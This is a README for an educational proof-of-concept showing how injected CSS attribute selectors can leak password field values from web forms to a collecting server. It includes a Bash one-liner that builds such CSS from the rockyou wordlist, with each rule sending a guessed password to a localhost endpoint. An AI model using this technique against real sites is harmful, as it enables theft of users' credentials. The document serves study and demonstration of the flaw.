# CSS Dictionary "Attack"

Example on how to steal information with CSS from web forms due to poor code quality or other vulnerabilities.

Attack is only possible under very specific conditions. First, the server must echo targeted parameter's value back to the web form, second, you need to find a way to link your own CSS file or to modify an existing one.

Even then it is hard to carry out this type of attack due to a large dictionary file size and high RAM consumption.

Tested on XAMPP for Windows v7.4.3 (64-bit) with Chrome v80.0.3987.149 (64-bit) and Firefox v74.0 (64-bit).

Made for educational purposes. I hope it will help!

## How to Run

Import [\\db\\css_dictionary.sql](https://github.com/ivan-sincek/css-dictionary-attack/blob/master/db/css_dictionary.sql) to your database server.

Copy all the content from [\\src\\](https://github.com/ivan-sincek/css-dictionary-attack/tree/master/src) to your server's web root directory (e.g. to \\xampp\\htdocs\\ on XAMPP).

Change the database settings inside [\\src\\api\\php\\config.ini](https://github.com/ivan-sincek/css-dictionary-attack/blob/master/src/api/php/config.ini) as necessary.

Navigate to the website with your preferred web browser.

---

To transform an already existing dictionary to the CSS dictionary, run the following Bash command (modify it to your need):

```bash
for word in $(cat rockyou_1000.txt); do echo "input[name=pwd][value=\"${word}\"]{background-image:url(http://localhost/api/css.php?v=${word})}"; done > rockyou_1000.css
```

**Check an already existing dictionary [here](https://github.com/ivan-sincek/css-dictionary-attack/blob/master/dict) and the CSS dictionary [here](https://github.com/ivan-sincek/css-dictionary-attack/blob/master/src/css/rockyou_1000.css).**

## Images

<p align="center"><img src="https://github.com/ivan-sincek/css-dictionary-attack/blob/master/img/dictionary.jpg" alt="CSS Dictionary"></p>

<p align="center">Figure 1 - CSS Dictionary</p>
